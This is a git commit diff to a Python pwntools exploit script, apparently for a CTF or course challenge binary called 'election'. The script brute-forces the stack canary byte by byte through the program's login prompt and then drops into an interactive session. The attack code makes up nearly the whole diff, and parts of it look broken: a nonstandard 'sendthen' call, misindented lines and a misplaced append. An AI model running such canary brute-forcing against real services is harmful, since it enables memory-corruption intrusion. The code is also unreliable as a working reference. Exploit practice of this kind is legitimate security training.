a786f12b46224a38a4500e1aa6ce229507ad14ce
jason2 <r07922115@ntu.edu.tw>
2019-12-13 20:25:05 +0800

    update from labpc

--- 0x08/exp.py
+++ 0x08/exp.py
@@ -7,24 +7,22 @@ r = process('./election', env={"LD_PRELOAD" : "./libc.so"})
 pause()
 
 # leak canary bruteforcely
-aaa = 'b' * 0xb8
-canary_leaker = bytearray(b'\x00' * 0xb8)
-i = 0
+aaa = 'a' * 0xb8
+canary_leaker = bytearray([0])
 
-# while 1:
 r.sendlineafter('>', '2') # register
-r.sendlineafter('Register an anonymous token: ', aaa)
-r.sendlineafter('>', '1') # login
-r.sendlineafter('Token: ', aaa + b'\x00') 
-    # if canary_leaker[i] == 0xff:
-        # j = i
-        # i += 1
-        # while j != 0:
-            
-    # canary_leaker[i] += 1
-    # if 'Invalid' not in r.recvline():
-        # success('buf 0x10 bytes match: {}'.format(canary_leaker))
-        # break
+r.sendthen('Register an anonymous token: ', aaa)
+
+for j in range(8):
+    for i in range(0xff):
+        r.sendlineafter('>', '1') # login
+        r.sendthen('Token: ', aaa + bytes(canary_leaker)) 
+        canary_leaker[-1] += 1
+        if 'Invalid' not in r.recvline():
+            success('buf {} bytes match: {}'.format(j, canary_leaker))
+                r.sendlineafter('>', '3') # logout
+                break
+        canary_leaker.append(0)
 
 r.interactive()
 
